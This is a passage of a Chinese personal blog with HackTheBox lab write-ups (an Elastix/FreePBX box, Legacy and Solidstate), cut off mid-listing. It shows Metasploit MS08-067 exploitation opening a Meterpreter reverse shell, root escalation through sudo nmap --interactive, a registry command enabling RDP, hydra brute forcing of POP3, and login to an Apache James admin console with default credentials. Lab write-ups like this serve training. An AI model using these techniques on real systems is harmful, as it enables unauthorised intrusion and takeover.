<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/freepbx_callmenum) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.10.16.122:4444</span><br><span class="line">[*] 10.10.10.7:443 - Sending evil request with range 200</span><br><span class="line">[*] 10.10.10.7:443 - Sending evil request with range 201</span><br><span class="line">^C[-] Exploit failed [user-interrupt]: Interrupt</span><br><span class="line">[-] run: Interrupted</span><br><span class="line">msf5 exploit(unix/http/freepbx_callmenum) &gt; show options Interrupt: use the 'exit' command to quit</span><br></pre></td></tr></table></figure>

<p>OPENSSL too new, auto discard low versio df key.</p>
<p><strong>solution</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use burp to proxy</span></span><br><span class="line"><span class="keyword">set</span> proxies <span class="keyword">http</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span></span><br><span class="line"><span class="keyword">set</span> ReverseAllowProxy <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span> <span class="keyword">use</span> it(<span class="keyword">unused</span>)</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">'s,^\(MinProtocol[ ]*=\).*,\1'</span>TLSv1<span class="number">.0</span><span class="string">',g'</span> /etc/ssl/openssl.cnf</span><br><span class="line">$ sed -i <span class="string">'s,^\(CipherString[ ]*=\).*,\1'</span><span class="keyword">DEFAULT</span>@SECLEVEL=<span class="number">1</span><span class="string">',g'</span> /etc/ssl/openssl.cnf</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查看信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for asterisk on this host:</span><br><span class="line">    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR</span><br><span class="line">    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE</span><br><span class="line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC</span><br><span class="line">    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET</span><br><span class="line">    XAUTHORITY"</span><br><span class="line"></span><br><span class="line">User asterisk may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /sbin/shutdown</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br><span class="line">    (root) NOPASSWD: /usr/bin/yum</span><br><span class="line">    (root) NOPASSWD: /bin/touch</span><br><span class="line">    (root) NOPASSWD: /bin/chmod</span><br><span class="line">    (root) NOPASSWD: /bin/chown</span><br><span class="line">    (root) NOPASSWD: /sbin/service</span><br><span class="line">    (root) NOPASSWD: /sbin/init</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/postmap</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/postfix</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/saslpasswd2</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/hardware_detector</span><br><span class="line">    (root) NOPASSWD: /sbin/chkconfig</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/elastix-helper</span><br></pre></td></tr></table></figure>

<p>发现个 nmap，交互式直接得 shell，开冲</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># uid=100(asterisk) gid=101(asterisk)</span></span><br><span class="line"><span class="comment"># sudo nmap --interactive</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )</span></span><br><span class="line"><span class="comment"># Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span></span><br><span class="line"><span class="comment"># nmap&gt; !sh</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span></span><br></pre></td></tr></table></figure>

<p>ref</p>
<ul>
<li><a href="https://github.com/rapid7/metasploit-framework/issues/6783" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/issues/6783</a></li>
<li><a href="https://blog.csdn.net/fastergohome/article/details/104165920" target="_blank" rel="noopener">https://blog.csdn.net/fastergohome/article/details/104165920</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/05/18/yuque/HackTheBox%EF%BC%9ALegacy%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/18/yuque/HackTheBox%EF%BC%9ALegacy%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Legacy笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-18T23:50:08+08:00">
                2020-05-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.4</span><br><span class="line">Host is up (0.0050s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT     STATE  SERVICE       VERSION</span><br><span class="line">139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open   microsoft-ds  Windows XP microsoft-ds</span><br><span class="line">3389/tcp closed ms-wbt-server</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 5d00h30m01s, deviation: 2h07m16s, median: 4d23h00m01s</span><br><span class="line">|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:b1:37 (VMware)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows XP (Windows 2000 LAN Manager)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_xp::-</span><br><span class="line">|   Computer name: legacy</span><br><span class="line">|   NetBIOS computer name: LEGACY\x00</span><br><span class="line">|   Workgroup: HTB\x00</span><br><span class="line">|_  System time: 2020-05-23T20:26:09+03:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br></pre></td></tr></table></figure>

<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
<p>转念一想，无 web 服务，只有 445+139 端口，这靶机应该是用远程溢出漏洞可以直接打<br>在 zenmap 里看到一堆脚本，于是用通配符直接扫了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap --script "smb-vuln*" -p 139,445 10.10.10.4</span></span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.10.4</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2008-4250</span><br><span class="line">|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to <span class="keyword">execute</span> arbitrary</span><br><span class="line">|           code via a crafted RPC request that <span class="keyword">triggers</span> the <span class="keyword">overflow</span> during <span class="keyword">path</span> canonicalization.</span><br><span class="line">|</span><br><span class="line">|     Disclosure <span class="built_in">date</span>: <span class="number">2008</span><span class="number">-10</span><span class="number">-23</span></span><br><span class="line">|     <span class="keyword">References</span>:</span><br><span class="line">|       https://technet.microsoft.com/en-us/<span class="keyword">library</span>/<span class="keyword">security</span>/ms08<span class="number">-067.</span>aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-<span class="keyword">bin</span>/cvename.cgi?<span class="keyword">name</span>=CVE<span class="number">-2008</span><span class="number">-4250</span></span><br><span class="line">|_smb-vuln-ms10<span class="number">-054</span>: <span class="literal">false</span></span><br><span class="line">|_smb-vuln-ms10<span class="number">-061</span>: Could <span class="keyword">not</span> negotiate a <span class="keyword">connection</span>:SMB: <span class="keyword">Failed</span> <span class="keyword">to</span> receive <span class="keyword">bytes</span>: EOF</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">26.05</span> <span class="keyword">seconds</span></span><br></pre></td></tr></table></figure>

<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>直接开 msf，08-067 的 exp，迅速拿到 shell</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms06_070_wkssvc) &gt; search 08-067</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                 Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  <span class="comment">----                                 ---------------  ----   -----  -----------</span></span><br><span class="line">   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms06_070_wkssvc) &gt; use 0</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; show</span><br><span class="line">[-] Argument required</span><br><span class="line"></span><br><span class="line">[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options</span><br><span class="line">[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   <span class="comment">----     ---------------  --------  -----------</span></span><br><span class="line">   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT    <span class="number">445</span>              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       The <span class="keyword">pipe</span> <span class="keyword">name</span> <span class="keyword">to</span> <span class="keyword">use</span> (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Id</span>  <span class="keyword">Name</span></span><br><span class="line">   <span class="comment">--  ----</span></span><br><span class="line">   <span class="number">0</span>   <span class="keyword">Automatic</span> Targeting</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; <span class="keyword">set</span> rhosts <span class="number">10.10</span><span class="number">.10</span><span class="number">.4</span></span><br><span class="line">rhosts =&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.4</span></span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>:<span class="number">4444</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">445</span> - Automatically detecting the target...</span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">445</span> - Fingerprint: Windows XP - Service Pack <span class="number">3</span> - lang:English</span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">445</span> - Selected Target: Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">445</span> - Attempting <span class="keyword">to</span> <span class="keyword">trigger</span> the vulnerability...</span><br><span class="line">[*] Sending stage (<span class="number">176195</span> <span class="keyword">bytes</span>) <span class="keyword">to</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.4</span></span><br><span class="line">[*] Meterpreter <span class="keyword">session</span> <span class="number">1</span> opened (<span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>:<span class="number">4444</span> -&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">1031</span>) <span class="keyword">at</span> <span class="number">2020</span><span class="number">-05</span><span class="number">-19</span> <span class="number">00</span>:<span class="number">12</span>:<span class="number">44</span> +<span class="number">0800</span></span><br></pre></td></tr></table></figure>

<h1 id="开-rdp"><a href="#开-rdp" class="headerlink" title="开 rdp"></a>开 rdp</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<p>压力大，直接格硬盘了。舒服</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1589820661255-ee3d0a96-9543-4688-af55-8dde28768da1.png#align=left&display=inline&height=798&margin=%5Bobject%20Object%5D&name=format.png&originHeight=798&originWidth=1023&size=202341&status=done&style=none&width=1023" alt="format.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/05/07/yuque/HackTheBox%EF%BC%9ASolidstate%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/07/yuque/HackTheBox%EF%BC%9ASolidstate%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Solidstate笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-07T18:01:39+08:00">
                2020-05-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>10.10.10.51<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588846004234-2aecdd42-2279-4c38-96bb-c1c9072be69e.png#align=left&display=inline&height=284&margin=%5Bobject%20Object%5D&name=image.png&originHeight=567&originWidth=890&size=160185&status=done&style=none&width=445" alt="image.png"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>粗略扫描下，发现好几个端口,</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># nmap 10.10.10.51</span><br><span class="line">Nmap scan report for 10.10.10.51</span><br><span class="line">Host is up (1.0s latency).</span><br><span class="line">Not shown: 995 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">25/tcp  open  smtp</span><br><span class="line">80/tcp  open  http</span><br><span class="line">110/tcp open  pop3</span><br><span class="line">119/tcp open  nntp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 扫描全端口</span><br><span class="line">## Nmap scan report for 10.10.10.51</span><br><span class="line">Host is up (4.8s latency).</span><br><span class="line">Not shown: 64192 closed ports, 1337 filtered ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  tcpwrapped</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)</span><br><span class="line">|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)</span><br><span class="line">|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)</span><br><span class="line">25/tcp   open  tcpwrapped</span><br><span class="line">|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.122 [10.10.16.122]),</span><br><span class="line">80/tcp   open  tcpwrapped</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Home - Solid State Security</span><br><span class="line">110/tcp  open  tcpwrapped</span><br><span class="line">119/tcp  open  tcpwrapped</span><br><span class="line">4555/tcp open  tcpwrapped</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1134.71 seconds</span><br></pre></td></tr></table></figure>

<p>首页发现一邮箱，试试爆破</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">webadmin@solid-state-security.com</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588846328871-37dfec67-2c35-4702-a15c-5ca5dfae0a70.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=620&originWidth=1689&size=496802&status=done&style=none&width=844.5" alt="image.png"><br>尝试用<code>rockyou.txt</code>和<code>fasttrack.txt</code>爆破 pop3，无果</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># hydra -l webadmin -P /usr/share/wordlists/rockyou.txt solid-state-security.com pop3 -v</span><br><span class="line"></span><br><span class="line">Hydra v8.9.1 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-07 17:35:14</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line"></span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking pop3://solid-state-security.com:110/</span><br><span class="line">[VERBOSE] Resolving addresses ... [VERBOSE] resolving done</span><br><span class="line">[VERBOSE] CAPABILITY: -ERR[VERBOSE] using POP3 CLEAR LOGIN mechanism</span><br><span class="line">[ERROR] Not an POP3 protocol or service shutdown: (null)</span><br><span class="line">[ERROR] Not an POP3 protocol or service shutdown: (null)</span><br><span class="line">[VERBOSE] Retrying connection for child 5</span><br><span class="line">[VERBOSE] Retrying connection for child 9</span><br><span class="line">[ERROR] Not an POP3 protocol or service shutdown: (null)</span><br><span class="line">[ERROR] Not an POP3 protocol or service shutdown: (null)</span><br><span class="line">[ERROR] Not an POP3 protocol or service shutdown: (null)</span><br><span class="line">[ERROR] Not an POP3 protocol or service shutdown: (null)</span><br><span class="line">[ERROR] Not an POP3 protocol or service shutdown: (null)</span><br><span class="line">[ERROR] Not an POP3 protocol or service shutdown: (null)</span><br><span class="line">[VERBOSE] Retrying connection for child 2</span><br><span class="line">[VERBOSE] Retrying connection for child 7</span><br><span class="line">[VERBOSE] Retrying connection for child 12</span><br><span class="line">[VERBOSE] Retrying connection for child 13</span><br><span class="line">[STATUS] 502.00 tries/min, 502 tries in 00:01h, 14343899 to do in 476:14h, 16 active</span><br><span class="line">[STATUS] 651.67 tries/min, 1955 tries in 00:03h, 14342446 to do in 366:49h, 16 active</span><br><span class="line">^[[A^[[B^[[C^[[C^C[ERROR] Received signal 2, going down ...</span><br><span class="line">^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.</span><br><span class="line"></span><br><span class="line"># # hydra -l webadmin -P /usr/share/wordlists/fasttrack.txt solid-state-security.com pop3 -v</span><br></pre></td></tr></table></figure>

<p>后面全端口的扫描结果也出来了，发现 4555 端口，并且搜索，发现一个 rce</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># searchsploit  james 2.3</span><br><span class="line">-------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                  |  Path</span><br><span class="line">                                | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------- ----------------------------------------</span><br><span class="line">Apache James Server 2.3.2 -</span><br><span class="line">Remote Command Execution        | exploits/linux/remote/35513.py</span><br><span class="line">----------------------------------------------------------- ------------</span><br></pre></td></tr></table></figure>

<p>默认密码是 root-root，并没有反弹 shell<br><del>直接 nc 连进去，</del>尝试了半个小时，发现必须要用 telnet 才能登录（才能互动）</p>
<h2 id="JAMES-Admin-Tool"><a href="#JAMES-Admin-Tool" class="headerlink" title="JAMES Admin Tool"></a>JAMES Admin Tool</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># nc 10.10.10.51 4555</span></span><br><span class="line"></span><br><span class="line">JAMES Remote Administration Tool 2.3.2</span><br><span class="line">Please enter your login and password</span><br><span class="line">Login id:</span><br><span class="line">root</span><br><span class="line">Password:</span><br><span class="line">root</span><br><span class="line">Welcome root. HELP for a list of commands</span><br><span class="line"></span><br><span class="line"><span class="section"># help</span></span><br><span class="line"></span><br><span class="line">Currently implemented commands:</span><br><span class="line">help display this help</span><br><span class="line">listusers display existing accounts</span><br><span class="line">countusers display the number of existing accounts</span><br><span class="line">adduser [<span class="string">username</span>][<span class="symbol">password</span>] add a new user</span><br><span class="line">verify [username] verify if specified user exist</span><br><span class="line">deluser [username] delete existing user</span><br><span class="line">setpassword [<span class="string">username</span>][<span class="symbol">password</span>] sets a user's password</span><br><span class="line">setalias [<span class="string">user</span>][<span class="symbol">alias</span>] locally 